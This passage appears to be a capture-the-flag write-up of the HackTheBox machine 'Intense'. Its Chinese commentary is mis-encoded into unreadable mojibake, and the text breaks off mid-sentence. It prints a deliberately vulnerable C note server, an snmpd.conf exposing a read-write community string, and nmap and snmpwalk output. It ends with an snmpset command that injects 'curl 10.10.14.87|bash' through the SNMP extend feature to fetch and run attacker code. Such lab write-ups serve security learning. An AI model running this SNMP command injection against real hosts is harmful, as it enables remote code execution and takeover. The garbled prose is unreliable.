æ¥ä¸‹æ¥è¿™ä¸€éƒ¨åˆ†æœ‰ç‚¹ç„å¦™ã€‚æ˜¾ç„¶æˆ‘ä»¬ç°åœ¨å·²ç»èƒ½è¯»æ–‡ä»¶è·Ÿåˆ—ç›®å½•äº†ã€‚ä½†æ˜¯å´æ²¡æœ‰ä¸€ä¸ªshell.è€Œåœ¨userçš„ç›®å½•ä¸‹ç›´æ¥ç»™äº†ä¸€ä¸ªcçš„æºç æç¤ºæˆ‘ä»¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_client</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> note[BUFFER_SIZE];</span><br><span class="line">    <span class="keyword">uint16_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> cmd;</span><br><span class="line">    <span class="comment">// copy var</span></span><br><span class="line">    <span class="keyword">uint8_t</span> buf_size;</span><br><span class="line">    <span class="keyword">uint16_t</span> offset;</span><br><span class="line">    <span class="keyword">uint8_t</span> copy_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get command ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;cmd, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">            <span class="comment">// write note</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;buf_size, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// prevent user to write over the buffer</span></span><br><span class="line">                <span class="keyword">if</span> (index + buf_size &gt; BUFFER_SIZE) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// write note</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;note[index], buf_size) != buf_size) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                index += buf_size;</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// copy part of note to the end of the note</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="comment">// get offset from user want to copy</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;offset, <span class="number">2</span>) != <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// sanity check: offset must be &gt; 0 and &lt; index</span></span><br><span class="line">                <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; index) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// get the size of the buffer we want to copy</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;copy_size, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// prevent user to write over the buffer's note</span></span><br><span class="line">                <span class="keyword">if</span> (index &gt; BUFFER_SIZE) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// copy part of the buffer to the end </span></span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;note[index], &amp;note[offset], copy_size);</span><br><span class="line"></span><br><span class="line">                index += copy_size;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// show note</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">write</span>(sock, note, index);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd, newsockfd, portno;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> clilen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>, <span class="title">cli_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ignore SIGCHLD, prevent zombies */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigchld_action</span> = &#123;</span></span><br><span class="line">        .sa_handler = SIG_DFL,</span><br><span class="line">        .sa_flags = SA_NOCLDWAIT</span><br><span class="line">    &#125;;</span><br><span class="line">    sigaction(SIGCHLD, &amp;sigchld_action, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First call to socket() function */</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sockfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ERROR opening socket"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(<span class="keyword">int</span>)&#123; <span class="number">1</span> &#125;, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">"setsockopt(SO_REUSEADDR) failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize socket structure */</span> </span><br><span class="line">    bzero((<span class="keyword">char</span> *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    portno = <span class="number">5001</span>;</span><br><span class="line"></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">    serv_addr.sin_port = htons(portno);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now bind the host address using bind() call.*/</span></span><br><span class="line">    <span class="keyword">if</span> (bind(sockfd, (struct sockaddr *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ERROR on binding"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">listen</span>(sockfd,<span class="number">5</span>);</span><br><span class="line">    clilen = <span class="keyword">sizeof</span>(cli_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (newsockfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"ERROR on accept"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create child process */</span></span><br><span class="line">        pid = fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"ERROR on fork"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* This is the client process */</span></span><br><span class="line">            <span class="built_in">close</span>(sockfd);</span><br><span class="line">            handle_client(newsockfd);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">close</span>(newsockfd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="comment">/* end of while */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸‹æˆ‘æ˜¯çœŸæ‡µäº†ã€‚å› ä¸ºçœ‹èµ·æ¥å°±æ˜¯ä¸ªpwné¢˜ã€‚ä½†æ¯”pwnæ›´é‡è¦çš„æ˜¯,æºç ä¸­å¯ä»¥çœ‹å‡ºæ¥å®ƒè·‘åœ¨127.0.0.1 5001ä¸Šã€‚é‚£ä¹ˆæˆ‘ä»¬å¤–ç½‘æ˜¯è®¿é—®ä¸åˆ°çš„ã€‚è¿™é‡Œä¼¼ä¹éœ€è¦ä¸€ä¸ªshellæ¥è®¿é—®ã€‚</p><p>äºæ˜¯ç»§ç»­è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚é¦–å…ˆè¯»äº†ä¸‹<code>/proc/net/tcp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/tcp</span><br><span class="line">sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     </span><br><span class="line">   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 27909 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 24101 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28936 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   3: 0100007F:1389 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25962 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   4: C30A0A0A:0050 570E0A0A:B5EE 01 00000000:00000000 00:00000000 00000000    33        0 328478 1 0000000000000000 138 4 30 10 7</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ1389å¯¹åº”çš„æ˜¯5001çš„16è¿›åˆ¶ã€‚å¹¶ä¸”å…¶uidæ˜¯0ã€‚è¿™è¯´æ˜æ˜¯rootè¿è¡Œ,æ­£å¥½ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚</p><p>æ¥ç€çªç„¶å‘ç°ä¸€ä¸ª/etc/snmp/snmpd.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">agentAddress  udp:161</span><br><span class="line"></span><br><span class="line">view   systemonly  included   .1.3.6.1.2.1.1</span><br><span class="line">view   systemonly  included   .1.3.6.1.2.1.25.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> rocommunity public  default    -V systemonly</span><br><span class="line"> rwcommunity SuP3RPrivCom90</span><br><span class="line"></span><br><span class="line">###############################################################################</span><br><span class="line">#</span><br><span class="line">#  SYSTEM INFORMATION</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#  Note that setting these values here, results in the corresponding MIB objects being &#39;read-only&#39;</span><br><span class="line">#  See snmpd.conf(5) for more details</span><br><span class="line">sysLocation    Sitting on the Dock of the Bay</span><br><span class="line">sysContact     Me &lt;user@intense.htb&gt;</span><br><span class="line">                                                 # Application + End-to-End layers</span><br><span class="line">sysServices    72</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Process Monitoring</span><br><span class="line">#</span><br><span class="line">                               # At least one  &#39;mountd&#39; process</span><br><span class="line">proc  mountd</span><br><span class="line">                               # No more than 4 &#39;ntalkd&#39; processes - 0 is OK</span><br><span class="line">proc  ntalkd    4</span><br><span class="line">                               # At least one &#39;sendmail&#39; process, but no more than 10</span><br><span class="line">proc  sendmail 10 1</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Disk Monitoring</span><br><span class="line">#</span><br><span class="line">                               # 10MBs required on root disk, 5% free on &#x2F;var, 10% free on all other disks</span><br><span class="line">disk       &#x2F;     10000</span><br><span class="line">disk       &#x2F;var  5%</span><br><span class="line">includeAllDisks  10%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  System Load</span><br><span class="line">#</span><br><span class="line">                               # Unacceptable 1-, 5-, and 15-minute load averages</span><br><span class="line">load   12 10 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###############################################################################</span><br><span class="line">#</span><br><span class="line">#  ACTIVE MONITORING</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">                                    #   send SNMPv1  traps</span><br><span class="line"> trapsink     localhost public</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Event MIB - automatically generate alerts</span><br><span class="line">#</span><br><span class="line">                                   # Remember to activate the &#39;createUser&#39; lines above</span><br><span class="line">iquerySecName   internalUser</span><br><span class="line">rouser          internalUser</span><br><span class="line">                                   # generate traps on UCD error conditions</span><br><span class="line">defaultMonitors          yes</span><br><span class="line">                                   # generate traps on linkUp&#x2F;Down</span><br><span class="line">linkUpDownNotifications  yes</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Arbitrary extension commands</span><br><span class="line">#</span><br><span class="line"> extend    test1   &#x2F;bin&#x2F;echo  Hello, world!</span><br><span class="line"> extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35</span><br><span class="line"></span><br><span class="line"> master          agentx</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™ä¸ªudpæˆ‘å°±ä¼°è®¡ä¸å¦™ï¼Œè‡ªå·±æ¢æµ‹ç«¯å£æ—¶è‚¯å®šåˆå¿˜è®°æ‰«udpäº†ã€‚è€Œä¸”ä»è¿™ä¸ªsnmp.confä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®ç»„<code>SuP3RPrivCom90</code>å±äº<code>rwcommunity</code>æœ‰ç€è¯»å†™æƒé™ã€‚äºæ˜¯æˆ‘å»æœç´¢äº†ä¸‹snmpç›¸å…³æ¼æ´,å‘ç°çœŸçš„å¯ä»¥è¾¾æˆgetshell</p><p>å…ˆnmapæ‰«ä¸‹ç¡®è®¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Jul 19 11:05:42 2020 as: nmap -sU -sC -oA nmap/intense-udp 10.10.10.195</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.195</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">161/udp open  snmp</span><br><span class="line">| snmp-info: </span><br><span class="line">|   enterprise: net-snmp</span><br><span class="line">|   engineIDFormat: unknown</span><br><span class="line">|   engineIDData: f20383648c26d05d00000000</span><br><span class="line">|   snmpEngineBoots: 603</span><br><span class="line">|_  snmpEngineTime: 10h34m03s</span><br><span class="line">| snmp-sysdescr: Linux intense 4.15.0-55-generic <span class="comment">#60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64</span></span><br><span class="line">|_  System uptime: 10h34m3.40s (3804340 timeticks)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Sun Jul 19 11:26:16 2020 -- 1 IP address (1 host up) scanned in 1234.34 seconds</span></span><br></pre></td></tr></table></figure><p>æœç„¶é…ç½®ä¸æ˜¯localhost:161çš„è¯æˆ‘ä»¬æ˜¯å¯ä»¥å¤–ç½‘ç›´æ¥è®¿é—®çš„ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®ç½‘ä¸Šçš„æ–‡ç« è¿›è¡Œäº†è§£äº†ã€‚<br><a href="https://digi.ninja/blog/snmp_to_shell.php" target="_blank" rel="noopener">https://digi.ninja/blog/snmp_to_shell.php</a><br> éœ€è¦æ³¨æ„çš„æ˜¯ã€‚è¦æ˜¯å‡ºç°äº†è·Ÿæ–‡ç« ä¸­ä¸€å¼€å§‹ä¸€æ ·çš„æŠ¥é”™,éœ€è¦æŒ‰ç…§è¿™ç¯‡ <a href="https://docs.linuxconsulting.mn.it/notes/net-snmp-errors" target="_blank" rel="noopener">æ–‡ç« </a>è¿›è¡Œç›¸å…³ä¸‹è½½ã€‚æˆ‘çš„kalié»˜è®¤ä¹Ÿæ˜¯ä¼šæŠ¥é”™çš„,éœ€è¦ä¸‹è½½é¢å¤–çš„ä¾èµ–å¹¶ä¿®æ”¹é…ç½®ã€‚</p><p> æˆåŠŸè¿è¡Œ<code>snmpwalk -v2c -c SuP3RPrivCom90  10.10.10.195  nsExtendOutput1</code>çš„è¯æ˜¯è¿™æ ·çš„<br><img src="/2020/07/22/hackthebox-Intense/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br> ä»æ–‡ç« ä¸­äº†è§£åˆ°,å¦‚æœç›´æ¥ä¿®æ”¹confæ–‡ä»¶,æ˜¯å¯ä»¥åˆ©ç”¨extend è¿™ä¸€éƒ¨åˆ†å¯æ‰§è¡Œå‘½ä»¤çš„ç‰¹ç‚¹æ¥è¿›è¡Œæ¶æ„å‘½ä»¤çš„æ’å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åœ¨è¿œç¨‹,è¿˜æœ‰æ–¹æ³•å¯ä»¥ç›´æ¥ä¿®æ”¹æˆ–è€…æ’å…¥åä»¤å—ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚æˆ‘å¾ˆå¿«æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ã€‚<br> <a href="https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/</a></p><p>ç¨å¾®è°ƒç”¨ä¸‹nsExtendObjectsã€‚ä¼šå‘ç°å®ƒä¼šæŠŠextendé‡Œçš„å‘½ä»¤éƒ½æ‰§è¡Œä¸€å›ã€‚<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~<span class="comment"># snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</span></span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">"test"</span> = STRING: /bin/bash</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">"test1"</span> = STRING: /bin/<span class="built_in">echo</span></span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">"test2"</span> = STRING: <span class="built_in">echo</span></span><br></pre></td></tr></table></figure><br>è¿™é‡Œtestæœ¬æ¥ä¸åº”è¯¥å­˜åœ¨çš„ã€‚åº”è¯¥æ˜¯å…¶ä»–äººåˆ›å»ºäº†è¿™ä¸ªå˜é‡ã€‚è€Œå®ƒæ˜¯<code>/bin/.bash</code>è°ƒç”¨çš„ã€‚æ‰€ä»¥æˆ‘ç›´æ¥æ‹¿æ¥ä¿®æ”¹å€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195   <span class="string">'nsExtendArgs."test"'</span> = <span class="string">'-c "curl 10.10.14.87|bash"'</span></span><br><span class="line"></span><br><span class="line">snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</span><br></pre></td></tr></table></figure><p><img src="/2020/07/22/hackthebox-Intense/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>getshell</p><p>è¿™é‡Œæˆ‘ç¬¬ä¸€æ¬¡è¯•æˆåŠŸäº†,åæ¥å› ä¸ºpwnä¸ä¼šå°±é€€å‡ºäº†ã€‚ç­‰ç¬¬äºŒå¤©å†å°è¯•åŒæ 